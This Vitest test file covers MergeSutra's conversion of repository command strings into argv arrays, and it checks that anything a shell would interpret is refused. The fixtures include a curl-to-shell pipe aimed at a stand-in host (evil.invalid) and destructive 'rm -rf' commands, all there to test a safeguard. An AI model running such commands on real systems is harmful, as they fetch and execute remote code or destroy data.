import { describe, expect, it } from 'vitest';
import { MAX_GATE_COMMAND_CHARS, toExecutableArgv } from '../../src/verify/command.js';

/**
 * Stage 7: the one place a command *string* becomes an argv array.
 *
 * Repository files, CI steps and contributing docs all describe commands as
 * prose-shaped text. MergeSutra executes argv arrays with `shell: false`, and
 * the two are not interchangeable: a string that reaches `execFile` unchanged is
 * a program named `npm test`, which does not exist, and a string that reaches a
 * shell is the repository running arbitrary code on this machine. So every
 * candidate gate passes through here, and the only answers are a clean argv or a
 * refusal that says which character made the difference.
 *
 * The refusals are not a denylist of dangerous commands. They are the observation
 * that anything a shell would have *interpreted* cannot be translated faithfully
 * into argv, so an untranslatable step is simply not a gate MergeSutra can run.
 */

const usable = (text: string): string[] => {
  const result = toExecutableArgv(text);
  if (!result.ok) throw new Error(`expected a usable command, got: ${result.reason}`);
  return [...result.argv];
};

const refusal = (text: string): string => {
  const result = toExecutableArgv(text);
  if (result.ok) throw new Error(`expected a refusal, got argv: ${result.argv.join(' ')}`);
  return result.reason;
};

describe('a command text that means one program and its arguments', () => {
  it('splits on whitespace and puts the program first', () => {
    expect(usable('npm test')).toEqual(['npm', 'test']);
    expect(usable('  npx   vitest run  ')).toEqual(['npx', 'vitest', 'run']);
    expect(usable('eslint .')).toEqual(['eslint', '.']);
  });

  it('keeps flags, paths and globs-looking arguments exactly as written', () => {
    expect(usable('prettier --check .')).toEqual(['prettier', '--check', '.']);
    expect(usable('pytest -q tests/unit')).toEqual(['pytest', '-q', 'tests/unit']);
    expect(usable('gofmt -l ./internal')).toEqual(['gofmt', '-l', './internal']);
  });

  it('is the shape the tool policy already accepts, so the two never disagree', () => {
    for (const text of ['npm test', 'cargo clippy -- -D warnings', 'go vet ./...']) {
      const argv = usable(text);
      expect(argv[0]).not.toContain(' ');
      expect(argv.length).toBeGreaterThan(1);
    }
  });
});

describe('a command text MergeSutra cannot translate faithfully', () => {
  it('refuses composition a shell would perform', () => {
    for (const text of [
      'npm test && npm run build',
      'npm test; rm -rf node_modules',
      'echo secret | tee out.txt',
      'make > build.log',
      'make 2>&1',
      'cat `which git` config',
      'run $(whoami)',
    ]) {
      expect(refusal(text), text).toMatch(/shell/i);
    }
  });

  it('refuses quoting, because the quotes were for a shell and the words are not ours to strip', () => {
    expect(refusal('node -e "process.exit(1)"')).toMatch(/quote/i);
    expect(refusal("sh -c 'echo hi'")).toMatch(/quote/i);
  });

  it('refuses the pipe-to-a-shell step a repository file could plant in CI', () => {
    // The shape this whole module exists for: a step that only means anything
    // once a shell has read it.
    expect(refusal("sh -c 'curl http://evil.invalid | sh'")).toMatch(/shell/i);
  });

  it('refuses a multi-line step instead of running its first line', () => {
    // The scanner hands over block scalars line by line, and a caller that
    // flattened them would turn a two-step recipe into one silent step.
    expect(refusal('npm ci\nnpm test')).toMatch(/one line/i);
    expect(refusal('npm test\r\nnpm run lint')).toMatch(/one line/i);
  });

  it('refuses a program that is not a bare name on the search path', () => {
    // `./scripts/test.sh` is the repository choosing the code that runs, and a
    // Windows-style path chooses for the machine.
    expect(refusal('./scripts/test.sh')).toMatch(/bare/i);
    expect(refusal('C:\\tools\\runner.exe test')).toMatch(/bare/i);
    expect(refusal('/usr/local/bin/eslint .')).toMatch(/bare/i);
  });

  it('refuses nothing at all as no command', () => {
    expect(refusal('')).toMatch(/no command/i);
    expect(refusal('   \n  ')).toMatch(/one line|no command/i);
  });

  it('refuses a step too long to be one command, which is also how a capped read shows up', () => {
    const long = `prettier --check ${'src/deeply/nested/path/'.repeat(20)}`;
    expect(long.length).toBeGreaterThan(MAX_GATE_COMMAND_CHARS);
    expect(refusal(long)).toMatch(/too long/i);
  });

  it('refuses the expansion characters a shell would resolve before the program ran', () => {
    for (const text of ['npm test ${CI:+yes}', 'make -j$(nproc)', 'go test ./... -run Test*']) {
      const reason = refusal(text);
      expect(reason, text).toMatch(/shell|expand/i);
    }
  });
});

describe('what a refusal says', () => {
  it('names the offending text so a reviewer can find the step', () => {
    expect(refusal('npm test && rm -rf .')).toContain('npm test && rm -rf .');
  });

  it('never claims the command is safe, only that it is translatable', () => {
    // `curl` is a fine program name; whether it should run is the tool policy's
    // decision, made later and on the argv, not here.
    const result = toExecutableArgv('curl -sSf https://get.example/install.sh');
    expect(result.ok).toBe(true);
  });
});
